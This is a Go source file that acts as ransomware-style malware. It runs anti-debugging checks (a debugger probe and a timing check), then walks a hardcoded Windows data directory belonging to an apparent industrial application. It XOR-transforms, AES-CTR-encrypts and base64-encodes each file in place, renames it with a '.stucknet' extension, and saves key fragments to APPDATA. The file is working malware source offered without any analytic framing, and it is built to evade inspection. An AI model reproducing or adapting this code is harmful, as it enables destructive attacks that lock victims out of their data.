package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"time"
)

var (
	hardcodedIV = []byte{0x4a, 0x78, 0x13, 0x2f, 0xaa, 0xbb, 0x7c, 0x00, 0x19, 0x88, 0x39, 0x4f, 0xff, 0xcc, 0x11, 0x09}
	appData     = os.Getenv("APPDATA")
)

func generateAESKey() []byte {
	key := make([]byte, 32)
	rand.Read(key)
	return key
}

func xorVariants(data []byte, key byte, variant int) []byte {
	output := make([]byte, len(data))
	switch variant {
	case 0:
		for i := range data {
			output[i] = data[i] ^ key
		}
	case 1:
		for i := range data {
			output[i] = data[i] ^ (key + byte(i%255))
		}
	case 2:
		for i := range data {
			output[i] = (data[i] ^ key) ^ byte(i%7)
		}
	}
	return output
}

func encryptAES_CTR(data, key, iv []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	stream := cipher.NewCTR(block, iv)
	encrypted := make([]byte, len(data))
	stream.XORKeyStream(encrypted, data)
	return encrypted, nil
}

func encryptFile(path string, aesKey []byte, xorKey byte, variant int) error {
	if strings.HasSuffix(path, ".stucknet") {
		return nil
	}

	input, err := ioutil.ReadFile(path)
	if err != nil {
		return nil
	}

	xored := xorVariants(input, xorKey, variant)

	encrypted, err := encryptAES_CTR(xored, aesKey, hardcodedIV)
	if err != nil {
		return err
	}

	b64 := base64.StdEncoding.EncodeToString(encrypted)

	err = ioutil.WriteFile(path, []byte(b64), 0644)
	if err != nil {
		return err
	}

	newPath := path + ".stucknet"
	err = os.Rename(path, newPath)
	if err != nil {
		return err
	}

	return nil

}

func encryptDirectory(root string, aesKey []byte, xorKey byte, variant int) {
	filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		if err == nil && !info.IsDir() {
			encryptFile(path, aesKey, xorKey, variant)
		}
		return nil
	})
}

func saveFragments(aesKey []byte, xorKey byte, variant int) {
	frag1 := aesKey[:16]
	frag2 := append(aesKey[16:], xorKey, byte(variant))

	ioutil.WriteFile(filepath.Join(appData, "frag1.bin"), frag1, 0644)
	ioutil.WriteFile(filepath.Join(appData, "frag2.bin"), frag2, 0644)
}

func checkTimeDelta(threshold time.Duration) bool {
	start := time.Now()
	time.Sleep(1 * time.Second)
	elapsed := time.Since(start)
	return elapsed > threshold
}

func isDebuggerPresent() bool {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	proc := kernel32.NewProc("IsDebuggerPresent")

	ret, _, _ := proc.Call()
	return ret != 0
}

func fakeDelay(seconds int) {
	for i := 0; i < seconds; i++ {
		time.Sleep(1 * time.Second)
	}
}

func brokenCodePath() {
	time.Sleep(2 * time.Second)
	os.Exit(2)
}

func antiDebugSuite() {
	triggered := false

	if isDebuggerPresent() {
		triggered = true
	}

	if checkTimeDelta(1500 * time.Millisecond) {
		triggered = true
	}

	if triggered {
		fakeDelay(3)
		brokenCodePath()
	}
}


func main() {

	antiDebugSuite()

	aesKey := generateAESKey()
	xorKey := byte(time.Now().Unix() % 256)
	variant := int(time.Now().Unix() % 3)

	encryptDirectory(`C:\Users\Public\OmegaIndustrialApp\data\`, aesKey, xorKey, variant)

	saveFragments(aesKey, xorKey, variant)

}